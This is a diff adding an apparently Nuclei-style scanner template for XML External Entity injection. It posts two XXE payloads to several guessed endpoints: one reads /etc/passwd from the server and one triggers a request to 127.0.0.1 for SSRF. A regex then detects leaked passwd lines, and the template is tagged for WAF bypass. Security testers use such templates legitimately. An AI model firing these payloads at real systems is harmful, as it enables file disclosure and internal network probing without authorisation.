@@ -1,0 +1,34 @@
+id: xxe-p1
+
+info:
+  name: XML External Entity Injection
+  author: custom
+  severity: high
+  description: XXE payloads for file disclosure and SSRF
+  tags: xxe,xml,waf-bypass
+
+http:
+  - raw:
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        {{payload}}
+
+    payloads:
+      payload:
+        - '<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <root>&xxe;</root>'
+        - '<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://127.0.0.1/"> ]> <root>&xxe;</root>'
+      path:
+        - "api/xml"
+        - "upload"
+        - "parse"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+        condition: or
